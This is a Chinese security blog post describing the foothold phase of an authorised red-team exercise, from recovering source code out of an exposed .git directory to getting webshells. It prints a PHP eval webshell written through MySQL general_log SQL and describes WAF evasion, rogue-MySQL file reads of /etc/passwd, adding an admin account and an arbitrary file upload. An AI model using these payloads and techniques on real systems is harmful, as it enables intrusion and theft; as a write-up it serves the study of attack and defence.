---
layout: post
author: Vulkey_Chen
title: "记一次攻防演习渗透过程"
date: 2020-11-22
music-id: 
permalink: /archives/2020-11-22/1
description: "记一次攻防演习渗透过程"
---

# 记一次攻防演习渗透过程

## 前言

记录一次攻防演习渗透过程，文章仅写关于「打点」环节的部分，也就是拿到靶标的Webshell为止。

任务: 拿到XXX业务系统权限...

## 过程

靶标是一个www的域名，简单看了下有机会硬啃（商业源码），但时间不多，先找找脆弱点，常规一套流程，收集子域、C段...

### 脆弱点发现

在对子域的常规扫描后，发现存在`.git`泄露:

![-w494](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054609733881.jpg)

以及发现了`phpMyAdmin`应用和一些`phpinfo()`信息泄漏:

![-w865](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054610914733.jpg)

看到这些，不由得兴奋了起来，接下来只要按照预期的想法: 通过`.git`拿到数据库账号密码（源码中一般会有），登录`phpMyAdmin`，然后拿到`Webshell`...

但...转折点来了，尝试使用`GitHack`等一系列常见工具去恢复`.git`，发现恢复的文件只有一些图片，看`Logs`发现有很多文件恢复失败，既然不能当一个`ScriptKid`一把梭哈，那就自己来手动恢复吧~

### Git原理与恢复

**基本概念**

Git有三个概念词需要了解: 1.工作区 2.版本库 3.暂存区

工作区就是正常的目录（你的项目位置）;版本库就是在工作区内的一个隐藏目录`.git`;如果你曾经注意过这个目录你会发现里面有许多东西，在该目录下会存在一个`index`文件，这被称之为暂存区。

除以上所述之外，大家都知道每一个Git项目都会有一个默认的分支`master`，在`.git`目录下有一个文件`head`，它用来指向`master`这个分支。

![-w992](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054630957919.jpg)

当我们使用`git add`时，实际上就是把文件添加进暂存区；使用`git commit`时，才会把暂存区的内容添加到当前分支，默认是`master`分支。

我们可以来实际的看一下`index`和`head`这两个文件:

![-w1108](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054636119175.jpg)

使用`Binwalk`直接分析，可以很直观的看见`index`内有许多内容，`head`并没有，直接`cat head`发现这就是一个单纯的文本内容:

```
ref: refs/heads/master
```

前面了解到这是一个分支指向，那我直接查看`.git`目录下的`refs/heads/master`文件，得到一串Hash值。

我们可以暂且认为这是`master`分支的一个记录，用于区分、比较。

大概了解了以上内容后，还需要了解有哪些文件才能够恢复`.git`?

首先我们来看一下`.git`目录内的一般结构:

| 名称       | 类型  | 作用                           |
|------------------|-----|-------------------------------|
| .git/index       | 文件  | 暂存区                           |
| .git/config      | 文件  | Git配置文件                       |
| .git/description | 文件  | GitWeb专用的描述文件                 |
| .git/info        | 文件夹 | 里面就一个exclude文件（与.gitignore互补），排除指定文件不用做Git提交 |
| .git/hooks       | 文件夹 | 存放一些钩子脚本                      |
| .git/HEAD        | 文件  | 记录分支                          |
| .git/objects     | 文件夹 | 存放所有数据                        |
| .git/refs        | 文件夹 | 存放提交对象的指针                     |

知道结构及其作用后，挑重点关注`objects`这个目录，但一看，全都是一些Hash命名的文件，根本不知道其对应关系:

![-w1102](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054656504449.jpg)

并且这些文件都没办法看:

![-w822](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054659230739.jpg)

查阅相关资料得知此类文件是将原文件内容经过`zlib`的`deflate`压缩后存储的( https://mirrors.edge.kernel.org/pub/software/scm/git/docs/user-manual.html#object-details ):

![-w1145](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054659652391.jpg)

而使用`zlib`进行解压查看文件内容时是这样的:

![-w1222](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054674810483.jpg)

这个文件更像是记录了一个目录结构，而关于此就又需要查阅资料了，具体请看: https://git-scm.com/book/zh/v2/Git-%E5%86%85%E9%83%A8%E5%8E%9F%E7%90%86-Git-%E5%AF%B9%E8%B1%A1

git中的对象(**对象对应文件**)`.git/objects`包含了:

1. SHA(所有用来表示项目历史信息的文件,是通过一个40个字符的（40-digit）“对象名”来索引的)
2. Blob对象(用来存储文件的内容)
3. Tree对象(有一串bunch指向Blob对象或是其它Tree对象的指针，一般表示内容之间的目录层次关系)
4. Commit对象(指向一个Tree对象, 并且带有相关的描述信息.)

![-w481](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059691330110.jpg)
(注: 图片来自 git-scm.com )

**猜测**: 按照这个逻辑，我们需要先获取`Commit`对象对应文件找到`Tree`对象对应文件再通过其获得`Blob`对象对应文件，最后解压即可获得源文件内容。

那这些对象内容都存储在哪里呢？通过之前使用`Binwalk`分析，显而易见，在`.git/index`文件中。

但是在这里`.git/index`文件无法直接查看，直接套用`GitHack`的( https://github.com/lijiejie/GitHack/blob/master/lib/parser.py )解析代码就行:

![-w716](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059735242568.jpg)

获得SHA1: `a797b1973fd62dc34a691c7fe3bce33a504f2b74`，但是找了半天没找到这个对应文件​，后来尝试搜索前几位和后几位，发现搜索到了后几位:

![-w664](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059737421527.jpg)

对比发现文件名和获取的SHA1值少了2位:

![-w387](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059738182126.jpg)

搜索发现原来前两位是作为了目录名:

![-w556](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059738625732.jpg)

但在这里，我们使用`zlib`去解压缩，发现存储在`.git/index`的SHA1值实际上就是一个`blob`对象的值，也就根本不需要获取`commit`、`tree`对象的值了，表示之前的顺序逆推逻辑是错误的:

![-w746](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059739165413.jpg)

接下来按照这个思路去编写脚本恢复源码即可。

**编写与恢复**

由于项目时间原因简单了解原理之后，没有过多的去研究，也不打算使用原生方法去恢复，还是采用最暴力的方法，使用命令行去恢复`.git`，想要让Git回退历史，使用`git reset --hard commit_id`命令，进行版本回退。

基于这个命令，我需要获取网站的这几个文件/目录:

1. `.git/index`
2. `.git/logs`
3. `.git/head`
4. `.git/objects`
5. `.git/refs`

先下载`.git/index`、`.git/head`、`.git/refs`、`.git/logs`(文件目录都是固定的无需考虑其他情况)而后解析`index`获取索引，根据索引依次下载`.git/objects`内的文件，最后全部下载完毕，获取`master`分支(`refs/heads/master`文件)对应的值带入该命令`git reset --hard commit_id`即可恢复:

![-w793](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054710482497.jpg)

但发现除此之外，发现恢复的文件寥寥无几，后来下载`.git/logs/head`发现该`.git`项目还有其他分支:

![-w742](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059680019130.jpeg)

这个记录中有两个SHA1的值，`master`对应前者，`shop`对应后者，简单修改命令`git reset --hard shop_commit_id`，还是那一套流程，恢复`shop`这个分支的源码即可。

### 获取子域 Webshell

获得源码之后翻数据库账号密码:

![-w307](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054714423847.jpg)

由于之前我们已经有了一个`phpinfo()`探针，网站绝对路径已知，所以直接上`phpMyAdmin`登录，尝试使用`into outfile`，有`--secure-file-priv`限制无法写入:

![-w767](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054716403383.jpg)

转而使用Mysql Log日志存储的方式进行写入:

```sql
set global general_log=on;
set global_log_file='/xxx/www/xxx.php';
select '<?php @eval($_REQUEST["xxx"]);?>';
```

访问相关文件却提示我无法访问(**403/AccessDefined**):

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054717903557.jpg)

遇到这种情况尝试以下几种方法:

1. 修改后缀访问，判断是否是只针对脚本后缀进行限制（上传.htaccess文件）
2. 修改内容访问，判断是否有安全防护对内容进行限制
3. 如若以上均未访问成功，则可以考虑覆盖原文件写入


这里我的情况是第三种，大概推测可能是因为新建的文件没有执行权限所导致，因为这里我们已经有源码了所以可以直接找已有的文件(**建议选择非业务相关的文件**)进行写入(**记得事后恢复**):

![-w562](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054723563640.jpg)


执行`phpinfo();`函数可以，但无法直接使用管理工具连接，抓包发现目标网站上了云WAF，对请求内容拦截了(该WAF还挺弱)，这种情况还是有很多中方式:

1. 配合Cknife、蚁剑等自定义修改传输内容(Base64编码等等)，但需要修改PHP文件内容配合解码
2. 直接上冰蝎、哥斯拉的马就行了

为图方便，选择`冰蝎3`，使用`file_put_contents`写入连接就行(这都不拦，WAF堪忧):

![-w362](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054723222387.jpg)

![-w699](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16054724217021.jpg)

### 瞄准靶标

进入子域的Webshell发现内网无机器、就是一个云服务器，一开始误以为打中靶标，因为在主战发现一个路径泄漏:

![-w503](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059692424662.jpg)

![-w170](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059693308877.jpg)

而子域服务器上也有对应目录并且文件一模一样，但是修改文件却没反应不生效，猜测很有可能主战业务曾经在这个子域服务器上，但后期进行了转移，原Web文件还留着。

尝试翻翻源码，找密码，后来找到了几个有用的东西:1.Adminer文件 2.数据配置信息

![-w500](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059695408421.jpg)

`Adminer`（类似phpMyAdmin的数据库管理工具）文件是随机的: `adminerxxxxxxxxx.php`，完全无法扫到，数据库配置密码与子域完全一样。

![-w626](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059702838497.jpg)

使用数据配置密码无法登录，但是这里`Adminer`可以直接连外网的`Mysql`数据库，使用脚本( https://github.com/Gifts/Rogue-MySql-Server )伪造一个Mysql服务端读取对应文件就好，这边以`/etc/passwd`为例:

![-w599](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059704881880.jpg)

如上图所示是成功读取到的，而我们在子域上也知道了对应的配置文件路径，直接伪造读取即可。

再使用Adminer登录进去时，使用如下几种方法尝试获取Webshell:

1. into outfile -> 失败
2. Mysql log -> 失败
3. Adminer是最新版本无漏洞 -> 失败
4. 获取管理员密码无法解密 -> 失败

最终选择添加新管理员登录:

![-w592](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059709196188.jpg)

登录之后寻找对应上传点(以最短攻击路径的方式进行GetWebShell):

![-w551](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059709890399.jpg)

测试如下后缀及服务器结果:

```
Key.jpg -> 上传成功
Key.php -> 上传失败WAF拦截
Key.phtml -> 上传失败文件类型不允许
```

![-w474](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059713996506.jpg)

![-w356](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059714116942.jpg)

我们在已经有源码的情况下，找到对应的代码进行审计就行，发现这里是白名单设置无法绕过:

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059714739649.jpg)

直接关键词寻找上传功能，发现函数:`xxx_upload_file`存在任意文件上传

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059715071352.jpg)

后续构建请求包以及使用回车直接绕过`CloudWAF`，上传成功:

![](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059715574505.jpg)

![-w436](https://chen-blog-oss.oss-cn-beijing.aliyuncs.com/2020-11-22/16059716055507.jpg)

至此靶标拿到，结束。

# 文末

很多时候还是需要去探寻事物的本质和原理，才能更加清晰明了的了解这个事物，否则什么东西都是现有的成品一把梭，遇到梭不了，容易出现惯性思维，可能就直接略过了。

